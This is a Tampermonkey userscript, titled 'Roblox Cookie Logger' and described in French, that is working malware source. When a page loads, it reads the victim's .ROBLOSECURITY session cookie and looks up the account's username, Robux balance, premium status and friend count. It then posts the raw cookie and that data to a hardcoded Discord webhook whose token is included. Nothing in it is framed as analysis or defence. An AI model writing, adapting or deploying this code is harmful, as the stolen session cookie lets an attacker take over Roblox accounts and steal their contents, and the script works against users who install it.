// ==UserScript==
// @name         Roblox Cookie Logger
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Récupère les infos du compte Roblox et les envoie à un webhook Discord.
// @grant        GM_xmlhttpRequest
// @connect      api.roblox.com
// @connect      discord.com
// ==/UserScript==

(function() {
    'use strict';

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1502798917857972286/HpBjJ9iGlBEK9crjQDFepbOvK13vEsEyZznVTSuOhwJPvggARWbq1PntaaLDsaE0ERnW";
    const COOKIE_NAME = ".ROBLOSECURITY";
    let sentCookies = new Set(JSON.parse(localStorage.getItem("robloxSentCookies") || "[]"));

    async function getUserIdFromCookie(cookie) {
        try {
            const response = await fetch("https://api.roblox.com/users/get-current-user", {
                headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
                credentials: 'include'
            });
            const data = await response.json();
            return data.Id;
        } catch (error) {
            return null;
        }
    }

    async function getRobloxAccountInfo(cookie) {
        try {
            const userId = await getUserIdFromCookie(cookie);
            if (!userId) return null;

            const [userInfo, robux, friendsCount] = await Promise.all([
                fetch(`https://api.roblox.com/users/${userId}`, { credentials: 'include' }).then(r => r.json()),
                fetch(`https://api.roblox.com/currency/balance`, {
                    headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
                    credentials: 'include'
                }).then(r => r.json()),
                fetch(`https://api.roblox.com/users/${userId}/friends/count`, { credentials: 'include' }).then(r => r.json())
            ]);

            const accountCreated = new Date(userInfo.Created);
            const accountAge = new Date().getFullYear() - accountCreated.getFullYear();
            const isPremium = userInfo.IsPremium || false;

            return {
                displayName: userInfo.DisplayName || userInfo.Username,
                username: userInfo.Username,
                robuxBalance: robux.balance || 0,
                premiumStatus: isPremium ? "Premium" : "No Premium",
                accountAge: accountAge,
                totalFriends: friendsCount.count || 0
            };
        } catch (error) {
            return null;
        }
    }

    async function sendToWebhook(cookie, accountInfo) {
        if (!accountInfo) return;

        const embed = {
            title: "Nouveau cookie Roblox détecté !",
            color: 0x00ff00,
            fields: [
                { name: "Display Name", value: accountInfo.displayName, inline: true },
                { name: "Username", value: accountInfo.username, inline: true },
                { name: "Robux Balance", value: accountInfo.robuxBalance.toString(), inline: true },
                { name: "Premium Status", value: accountInfo.premiumStatus, inline: true },
                { name: "Account Age (Year)", value: accountInfo.accountAge.toString(), inline: true },
                { name: "Total Friends", value: accountInfo.totalFriends.toString(), inline: true },
                { name: "Cookie", value: `\`\`\`${cookie}\`\`\``, inline: false }
            ],
            timestamp: new Date().toISOString()
        };

        try {
            await GM_xmlhttpRequest({
                method: "POST",
                url: WEBHOOK_URL,
                headers: { "Content-Type": "application/json" },
                data: JSON.stringify({ embeds: [embed] })
            });
            sentCookies.add(cookie);
            localStorage.setItem("robloxSentCookies", JSON.stringify(Array.from(sentCookies)));
        } catch (error) {}
    }

    async function checkAndSendCookie() {
        const currentCookie = document.cookie.split(';').find(c => c.trim().startsWith(`${COOKIE_NAME}=`))?.split('=')[1];
        if (currentCookie && !sentCookies.has(currentCookie)) {
            const accountInfo = await getRobloxAccountInfo(currentCookie);
            if (accountInfo) await sendToWebhook(currentCookie, accountInfo);
        }
    }

    checkAndSendCookie();
})();
